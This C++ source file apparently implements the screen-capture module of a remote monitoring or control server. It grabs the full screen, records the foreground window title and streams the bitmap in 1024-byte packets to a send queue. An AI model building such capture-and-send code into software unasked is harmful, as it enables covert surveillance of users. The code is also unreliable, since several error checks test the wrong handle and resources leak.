#include "stdafx.h"
#include"server_pic_shoot.h"

using namespace std;

void PicShot::setStorePath(wchar_t* path)
{
	wcscpy(this->storePath, path);
	return;
}

void PicShot::setClockTick(DWORD frequency)
{
	this->clockTick = frequency;
	return;
}

PicShot::PicShot(int mid)
{
	this->mID = mid;
	this->hEvent = gExchangeBuffer[mID].sendEvent;
	this->readBuffer = gExchangeBuffer[mID].mainWrite;
	this->writeBuffer = gExchangeBuffer[mID].mainRead;
}

PicShot::PicShot(DWORD frequency)
{
	this->clockTick = frequency;
}

PicShot::PicShot(DWORD frequency, wchar_t* path)
{
	this->clockTick = frequency;
	wcscpy(this->storePath, path);
}

PicShot::~PicShot()
{
}

void PicShot::Shoot(void) throw(DWORD)
{
	HDC hCurScreen = GetDC(NULL);
	if (hCurScreen == NULL)
	{
		cout << "Get Current Screen Handle Faild" << endl;
		throw GetLastError();
	}
	HDC hScreenInMem = CreateCompatibleDC(hCurScreen);
	if (hCurScreen == NULL)
	{
		cout << "Create DC In Memory Faild" << endl;
		throw GetLastError();
	}
	int width = GetSystemMetrics(SM_CXSCREEN);
	int height = GetSystemMetrics(SM_CYSCREEN);

	HBITMAP hBitmap = CreateCompatibleBitmap(hCurScreen, width, height);
	if (hCurScreen == NULL)
	{
		cout << "Create BitMap Faild" << endl;
		throw GetLastError();
	}
	SelectObject(hScreenInMem, hBitmap);
	if (!BitBlt(
		hScreenInMem,
		0,
		0,
		width,
		height,
		hCurScreen,
		0,
		0,
		SRCCOPY
	))
	{
		cout << "Get Pic From DC Faild" << endl;
		throw GetLastError();
	}

	BITMAPINFOHEADER bmpInfoHeader;
	bmpInfoHeader.biSize = sizeof(BITMAPINFOHEADER);
	bmpInfoHeader.biWidth = width;
	bmpInfoHeader.biHeight = height;
	bmpInfoHeader.biPlanes = 1;
	bmpInfoHeader.biBitCount = 16;
	bmpInfoHeader.biCompression = BI_RGB;
	bmpInfoHeader.biSizeImage = 0;
	bmpInfoHeader.biXPelsPerMeter = 0;
	bmpInfoHeader.biYPelsPerMeter = 0;
	bmpInfoHeader.biClrUsed = 0;
	bmpInfoHeader.biClrImportant = 0;

	DWORD bmpSize = ((width * bmpInfoHeader.biBitCount + 31) / 32) * 4 * height;
	DWORD sizefoDIB = bmpSize + sizeof(BITMAPINFOHEADER) + sizeof(BITMAPFILEHEADER);
	BITMAPFILEHEADER bmpfileHeader;

	bmpfileHeader.bfOffBits = (DWORD)sizeof(BITMAPFILEHEADER) + (DWORD)sizeof(BITMAPINFOHEADER);
	bmpfileHeader.bfSize = sizefoDIB;
	bmpfileHeader.bfType = 0x4D42;

	char* bitmap = new char[sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + bmpSize];
	ZeroMemory(bitmap, sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + bmpSize);

	memcpy(bitmap, (char*)&bmpfileHeader, sizeof(BITMAPFILEHEADER));
	memcpy(&(bitmap[sizeof(BITMAPFILEHEADER)]), (char*)&bmpInfoHeader, sizeof(BITMAPINFOHEADER));

	GetDIBits(
		hScreenInMem,
		hBitmap,
		0,
		(UINT)height,
		&(bitmap[sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER)]),
		(BITMAPINFO*)&bmpInfoHeader,
		DIB_RGB_COLORS
	);
	int size = (sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + bmpSize);


	//ofstream ofs("D:\\test.bmp", ios_base::binary);
	//ofs.write((char*)bitmap, size);
	//ofs.close();

	int packs = size;

	memcpy(writeBuffer, (BYTE*)&packs, 4);
	gExchangeBuffer[mID].sendSize = 1024;
	ResetEvent(hEvent);
	while (!gQueueAccessLocked)
	{
		gQueueAccessLocked = TRUE;
		gSendDataQueues.push(mID);
		gQueueAccessLocked = FALSE;
		break;
	}
	WaitForSingleObject(hEvent, INFINITE);

	if ((packs % 1024) > 0)
	{
		packs = packs / 1024 + 1;
	}
	else
	{
		packs = packs / 1024;
	}

	for (int i = 0; i < packs; i++)
	{
		
		ZeroMemory(writeBuffer, 1024);
		if (i != packs - 1)
		{
			memcpy(writeBuffer, &(bitmap[i * 1024]), 1024);
			gExchangeBuffer[mID].sendSize = 1024;
		}
		else
		{
			memcpy(writeBuffer, &(bitmap[i * 1024]), (size - i * 1024));
			gExchangeBuffer[mID].sendSize = (size - i * 1024);
		}
		
		ResetEvent(hEvent);
		while (!gQueueAccessLocked)
		{
			gQueueAccessLocked = TRUE;
			gSendDataQueues.push(mID);
			gQueueAccessLocked = FALSE;
			break;
		}
		WaitForSingleObject(hEvent, INFINITE);
	}

	//time_t current;
	//current = time(NULL);

	//wstring name = storePath;
	//name += L"picshoot_";
	//name += to_wstring(current);
	//name += L".bmp";

	//ofstream ofs(name, ios_base::binary);
	//ofs.write((char*)&bmpfileHeader, sizeof(BITMAPFILEHEADER));
	//ofs.write((char*)&bmpInfoHeader, sizeof(BITMAPINFOHEADER));
	//ofs.write((char*)bitmap, bmpSize);
	//ofs.close();
	cout << "Pic Shooted!" << endl;

	DeleteDC(hCurScreen);
	DeleteDC(hScreenInMem);
}

DWORD WINAPI PicShot::ThreadProc(LPVOID lpParameter)
{
	PicShot* lpTemp = (PicShot*)lpParameter;
	lpTemp->Shoot();
	return 0;
}
void PicShot::PicCircule(void)
{
	wchar_t* szNewName;

	while (1)
	{
		if (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE))
		{
			if (msg.message == TERMINATE_CMD)
			{
				break;
			}
			if (msg.message == PIC_SHOOT)
			{
				szNewName = new wchar_t[MAX_PATH];
				ZeroMemory(szNewName, MAX_PATH);
				HWND hWND = GetForegroundWindow();
				GetWindowText(hWND, szNewName, MAX_PATH);
				//wcout << "Current Windows Is : " << szNewName << endl;
				if (1)
				{
					wcscpy(currentWND, szNewName);
					HANDLE pcs = CreateThread(NULL, 0, ThreadProc, this, 0, NULL);
					WaitForSingleObject(pcs, INFINITE);
					dPicCounter++;
				}
				delete[]szNewName;
			}
		}
	}

	cout << "See U!" << endl;
	return;
}